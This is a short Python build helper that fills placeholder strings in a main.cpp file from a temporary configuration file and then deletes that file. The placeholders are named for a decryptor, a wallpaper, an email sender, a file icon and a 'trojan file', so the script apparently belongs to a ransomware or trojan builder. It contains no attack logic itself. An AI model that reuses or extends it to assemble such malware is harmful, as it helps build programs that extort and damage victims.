import os

main_cppRead = open('main.cpp', 'r')
lines = main_cppRead.readlines()
content = ""
inside = False

for line_ in open('preCompilation.tmp', 'r').readlines():
    if line_.split('=')[0] == 'decryptor':
        decryptorText = line_.split('=')[1]
    if line_.split('=')[0] == 'wallpaper':
        wallpaperText = line_.split('=')[1]
    if line_.split('=')[0] == 'emailsender':
        emailSenderText = line_.split('=')[1]
    if line_.split('=')[0] == 'fileicon':
        fileIconText = line_.split('=')[1]
    if line_.split('=')[0] == 'customfile':
        customFileText = line_.split('=')[1]
    if line_.split('=')[0] == 'trojanfile':
        trojanFileText = line_.split('=')[1]

for i in range(len(lines)):
    line = lines[i]
    if inside:
        if line == ';\n':
            inside = False
        continue
    if line == 'string InfoDecryptorContent = \n':
        inside = True
        content += 'string InfoDecryptorContent = "' + decryptorText[:-1] + '";\n'
        continue
    if line == 'string WallpaperContent = \n':
        inside = True
        content += 'string WallpaperContent = "' + wallpaperText[:-1] + '";\n'
        continue
    if line == 'string EmailSenderContent = \n':
        inside = True
        content += 'string EmailSenderContent = "' + emailSenderText[:-1] + '";\n'
        continue
    if line == 'string FileIconContent = \n':
        inside = True
        content += 'string FileIconContent = "' + fileIconText[:-1] + '";\n'
        continue
    if line == 'string CustomFileContent = \n':
        inside = True
        content += 'string CustomFileContent = "' + customFileText[:-1] + '";\n'
        continue
    if line == 'string TrojanFileContent = \n':
        inside = True
        content += 'string TrojanFileContent = "' + trojanFileText[:-1] + '";\n'
        continue
    content += line

main_cppRead.close()
os.remove('preCompilation.tmp')

main_cppWrite = open('main.cpp', 'w')
main_cppWrite.write(content)
main_cppWrite.close()
